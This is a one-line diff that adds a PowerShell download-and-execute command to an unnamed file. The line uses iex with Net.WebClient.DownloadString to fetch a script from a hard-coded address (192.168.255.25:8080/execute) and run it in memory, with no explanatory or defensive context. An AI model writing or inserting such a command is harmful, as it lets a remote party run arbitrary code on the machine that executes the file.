@@ -1,0 +1,1 @@
+Powershell -Command iex(new-object system.net.webclient).DownloadString('http://192.168.255.25:8080/execute')
